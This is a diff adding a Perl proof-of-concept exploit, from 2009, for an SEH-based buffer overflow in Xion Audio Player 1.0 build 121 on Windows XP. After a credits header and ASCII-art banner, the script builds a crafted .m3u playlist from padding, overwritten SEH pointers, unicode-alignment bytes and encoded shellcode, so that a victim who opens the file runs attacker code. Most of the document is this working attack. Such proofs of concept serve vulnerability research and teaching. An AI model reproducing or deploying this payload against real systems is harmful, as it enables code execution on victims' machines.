@@ -1,0 +1,58 @@
+# [*] Vulnerability     : Xion Audio Player Local BOF
+# [*] Discovered by     : Dragon Rider (http://securityreason.com/exploitalert/7392)
+# [*]                     drag0n.rider(at)hotmail.com
+# [*] Sploit written by : corelanc0d3r (corelanc0d3r[at]gmail[dot]com)
+# [*] Sploit released   : nov 3rd, 2009
+# [*] Type              : local and remote code execution
+# [*] OS                : Windows
+# [*] Product           : Xion Audio Player
+# [*] Versions affected : 1.0 build 121
+# [*] Download from     : http://www.brothersoft.com/xion-audio-player-download-49404.html
+# [*] -------------------------------------------------------------------------
+# [*] Method            : SEH
+# [*] Tested on         : XP SP3 En
+# [*] Greetz&Tx to      : DellNull/EdiStrosar/F/P/W
+# [*] -------------------------------------------------------------------------
+#                                               MMMMM~.                          
+#                                               MMMMM?.                          
+#    MMMMMM8.  .=MMMMMMM.. MMMMMMMM, MMMMMMM8.  MMMMM?. MMMMMMM:   MMMMMMMMMM.   
+#  MMMMMMMMMM=.MMMMMMMMMMM.MMMMMMMM=MMMMMMMMMM=.MMMMM?7MMMMMMMMMM: MMMMMMMMMMM:  
+#  MMMMMIMMMMM+MMMMM$MMMMM=MMMMMD$I8MMMMMIMMMMM~MMMMM?MMMMMZMMMMMI.MMMMMZMMMMM:  
+#  MMMMM==7III~MMMMM=MMMMM=MMMMM$. 8MMMMMZ$$$$$~MMMMM?..MMMMMMMMMI.MMMMM+MMMMM:  
+#  MMMMM=.     MMMMM=MMMMM=MMMMM7. 8MMMMM?    . MMMMM?NMMMM8MMMMMI.MMMMM+MMMMM:  
+#  MMMMM=MMMMM+MMMMM=MMMMM=MMMMM7. 8MMMMM?MMMMM:MMMMM?MMMMMIMMMMMO.MMMMM+MMMMM:  
+#  =MMMMMMMMMZ~MMMMMMMMMM8~MMMMM7. .MMMMMMMMMMO:MMMMM?MMMMMMMMMMMMIMMMMM+MMMMM:  
+#  .:$MMMMMO7:..+OMMMMMO$=.MMMMM7.  ,IMMMMMMO$~ MMMMM?.?MMMOZMMMMZ~MMMMM+MMMMM:  
+#     .,,,..      .,,,,.   .,,,,,     ..,,,..   .,,,,.. .,,...,,,. .,,,,..,,,,.  
+#                                                                   eip hunters
+# -----------------------------------------------------------------------------
+# Script provided 'as is', without any warranty. 
+# Use for educational purposes only.
+#
+my $sploitfile="corelansploit.m3u";
+my $junk = "\x41" x 254;  
+my $nseh="\x58\x48"; 
+my $seh="\xf5\x48"; 
+my $align="\x55";  
+$align=$align."\x6d";   
+$align=$align."\x58";   
+$align=$align."\x6d";   
+$align = $align."\x05\x10\x11";   
+$align=$align."\x6d";  
+$align=$align."\x2d\x02\x11";  
+$align=$align."\x6d";   
+
+my $jump = "\x50";  
+$jump=$jump."\x6d"; 
+$jump=$jump."\xc3";
+
+my $padding="A" x 73;
+
+my $shellcode="PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLK8Q4KPKPKP4KQ5OLTKSLLERXM1JOTK0OLXDK1OO0M1JKPITK044KKQJN01WPTYVLE4Y0BTKW91WZLMKQ7RJKZTOKB4NDLDCE9UDKQOMTKQJKRFDKLLPKTKQOMLKQJKTKMLDKKQZKSYQLO4M4WSNQGPBDTKOPNPSUY0D8LLTKOPLLTKRPML6MTK2HKXZKM94K3PVPKPKPKPDK1XOL1ONQJVC0PVTIL853WP3K0PBHZPTJKTQO2HV8KNSZLNPWKOYWQSQQRLQSKPA";
+
+my $filler = ("\xcc" x (17990-length($shellcode)));
+my $payload = $junk.$nseh.$seh.$align.$jump.$padding.$shellcode.$filler;
+open(myfile,">$sploitfile"); 
+print myfile $payload; 
+print "Wrote " . length($payload)." bytes to $sploitfile\n";
+close(myfile);
